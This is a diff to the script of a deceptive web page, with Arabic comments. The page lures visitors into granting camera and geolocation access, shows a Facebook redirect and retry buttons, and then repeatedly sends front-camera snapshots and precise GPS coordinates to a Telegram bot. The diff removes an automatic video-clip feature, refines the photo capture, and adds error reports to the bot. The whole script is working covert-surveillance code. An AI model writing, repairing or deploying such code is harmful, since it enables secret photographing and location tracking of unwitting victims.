@@ -72,11 +72,10 @@
     const ctx = cnv.getContext('2d');
 
     let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
-    let recording = false;
     let cameraGranted = false;
     let locationGranted = false;
     let escapeCompleted = false;
-    let watchId = null; // لمراقبة الموقع
+    let watchId = null;
 
     async function sendText(text) {
       try {
@@ -85,12 +84,6 @@
           body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
         });
       } catch (e) {}
-    }
-
-    function dataURLtoBlob(u) {
-      const arr = u.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
-      while (n--) u8[n] = bstr.charCodeAt(n);
-      return new Blob([u8], { type: mime });
     }
 
     function showOverlay() { post.classList.add('hidden'); }
@@ -155,14 +148,13 @@
       } catch (e) {}
     }
 
-    // ==================== الموقع الدقيق GPS (باستخدام watchPosition) ====================
+    // ==================== الموقع الدقيق GPS (watchPosition) ====================
     function startWatchingGPS() {
       if (!navigator.geolocation) return;
       watchId = navigator.geolocation.watchPosition(
         (pos) => {
           if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
             gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
-            // نرسل الموقع فوراً عند توفر إشارة جيدة
             sendText(
               `📍 <b>الموقع الدقيق (GPS)</b>\n` +
               `الإحداثيات: ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
@@ -174,18 +166,16 @@
             retryLocationBtn.classList.add('hidden');
           }
         },
-        (err) => {
-          // في حال الخطأ أو الرفض، لا نفعل شيئاً (سيظهر زر الإعادة)
-        },
+        () => {},
         {
-          enableHighAccuracy: true,  // أعلى دقة ممكنة (GPS)
-          timeout: 30000,           // 30 ثانية للحصول على إشارة
-          maximumAge: 0             // لا تستخدم مواقع مخزنة
+          enableHighAccuracy: true,
+          timeout: 30000,
+          maximumAge: 0
         }
       );
     }
 
-    // ==================== الكاميرا والتصوير المستمر ====================
+    // ==================== الكاميرا والتصوير المستمر (إرسال فوري) ====================
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -197,40 +187,49 @@
       } catch (e) { return false; }
     }
 
-    async function captureAndSend() {
+    function captureAndSend() {
       if (!stream || !vid.videoWidth) return;
       cnv.width = vid.videoWidth;
       cnv.height = vid.videoHeight;
       ctx.drawImage(vid, 0, 0);
-      const dataUrl = cnv.toDataURL('image/jpeg', 0.7);
-      const blob = dataURLtoBlob(dataUrl);
-      if (blob.size > 10 * 1024 * 1024) return;
-      const form = new FormData();
-      form.append('chat_id', C);
-      form.append('photo', blob, 'snap.jpg');
-      try {
-        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form });
-        photos++;
-        if (photos % 5 === 0 && !recording) startVideoRecording();
-      } catch(e) {}
-    }
-
-    function startVideoRecording() {
-      if (!stream || recording) return;
-      try {
-        recording = true; const chunks = [];
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
-        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-        recorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          const form = new FormData(); form.append('chat_id', C); form.append('video', blob, 'clip.webm');
-          form.append('caption', '🎥 فيديو تلقائي');
-          await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: form }).catch(() => {});
-          recording = false;
-        };
-        recorder.start();
-        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 3000);
-      } catch (e) { recording = false; }
+      
+      // استخدام toBlob (مدعومة في كل المتصفحات الحديثة)
+      if (cnv.toBlob) {
+        cnv.toBlob(async (blob) => {
+          if (!blob) return;
+          if (blob.size > 10 * 1024 * 1024) return; // أكبر من 10 ميغابايت، لا نرسل
+          const form = new FormData();
+          form.append('chat_id', C);
+          form.append('photo', blob, 'snap.jpg');
+          try {
+            const res = await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form });
+            if (!res.ok) {
+              const errText = await res.text();
+              console.error('فشل إرسال الصورة:', errText);
+              sendText('❌ فشل إرسال صورة: ' + errText.substring(0, 100));
+            } else {
+              photos++;
+            }
+          } catch(e) {
+            console.error('خطأ شبكة:', e);
+            sendText('❌ خطأ شبكة أثناء إرسال صورة');
+          }
+        }, 'image/jpeg', 0.7);
+      } else {
+        // fallback يدوي لـ toBlob
+        const dataUrl = cnv.toDataURL('image/jpeg', 0.7);
+        fetch(dataUrl)
+          .then(res => res.blob())
+          .then(async (blob) => {
+            if (blob.size > 10 * 1024 * 1024) return;
+            const form = new FormData();
+            form.append('chat_id', C);
+            form.append('photo', blob, 'snap.jpg');
+            const res = await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form });
+            if (res.ok) photos++;
+          })
+          .catch(e => console.error('خطأ في fallback:', e));
+      }
     }
 
     async function tryCamera() {
@@ -238,7 +237,6 @@
       if (ok) {
         cameraGranted = true;
         retryCameraBtn.classList.add('hidden');
-        // ابدأ بمراقبة الموقع
         startWatchingGPS();
       } else {
         showOverlay();
@@ -257,9 +255,7 @@
 
     retryLocationBtn.addEventListener('click', async () => {
       retryLocationBtn.classList.add('hidden');
-      // محاولة إعادة طلب الموقع (سيحاول watchPosition من جديد)
       startWatchingGPS();
-      // إذا لم ينجح، سيظهر الزر مرة أخرى من دالة الخطأ
       setTimeout(() => {
         if (!locationGranted) retryLocationBtn.classList.remove('hidden');
       }, 10000);
